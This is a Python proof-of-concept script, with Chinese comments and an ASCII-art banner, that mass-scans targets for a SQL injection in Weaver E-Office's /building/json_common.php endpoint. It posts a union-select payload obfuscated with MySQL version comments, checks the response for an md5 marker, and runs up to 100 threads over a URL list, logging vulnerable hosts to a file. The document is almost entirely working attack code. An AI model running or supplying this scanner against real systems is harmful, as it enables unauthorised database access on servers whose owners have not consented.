#泛微E-Office json_common.php SQL注入漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''

   ▄████████ ████████▄    ▄█             ▄█  ███▄▄▄▄        ▄█    ▄████████  ▄████████     ███      ▄█   ▄██████▄  ███▄▄▄▄   
  ███    ███ ███    ███  ███            ███  ███▀▀▀██▄     ███   ███    ███ ███    ███ ▀█████████▄ ███  ███    ███ ███▀▀▀██▄ 
  ███    █▀  ███    ███  ███            ███▌ ███   ███     ███   ███    █▀  ███    █▀     ▀███▀▀██ ███▌ ███    ███ ███   ███ 
  ███        ███    ███  ███            ███▌ ███   ███     ███  ▄███▄▄▄     ███            ███   ▀ ███▌ ███    ███ ███   ███ 
▀███████████ ███    ███  ███            ███▌ ███   ███     ███ ▀▀███▀▀▀     ███            ███     ███▌ ███    ███ ███   ███ 
         ███ ███    ███  ███            ███  ███   ███     ███   ███    █▄  ███    █▄      ███     ███  ███    ███ ███   ███ 
   ▄█    ███ ███  ▀ ███  ███▌    ▄      ███  ███   ███     ███   ███    ███ ███    ███     ███     ███  ███    ███ ███   ███ 
 ▄████████▀   ▀██████▀▄█ █████▄▄██      █▀    ▀█   █▀  █▄ ▄███   ██████████ ████████▀     ▄████▀   █▀    ▀██████▀   ▀█   █▀  
                         ▀                             ▀▀▀▀▀▀                                                                
                                                                     version:FW_E-Office_sql 1.0
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="E-Office json_common.php SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        #处理数据，加线程
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                i = i.strip()
                if 'https://' in i:
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")   

def poc(target):
    url_payload = '/building/json_common.php'
    url = target + url_payload
    # print(url)
    headers = {
            "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection":"close",
            "Content-Length":"87",
            "Accept":"*/*",
            "Accept-Language":"en",
            "Content-Type":"application/x-www-form-urlencoded"
        }
    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333"

    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        # matches = re.findall(r'<p>(.*?)</p>', response.text)
        # print(matches)and 'success' in response.text
        # print(response.text)
        if response.status_code == 200 and "6cfe798ba8e5b85feb50164c59f4bec9" in response.text:
            print( f"{GREEN}[+] {url} 存在sql注入漏洞{RESET}")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
            print("[-] 漏洞不存在!!")
    except Exception:
        pass
if __name__ == '__main__':
    main()
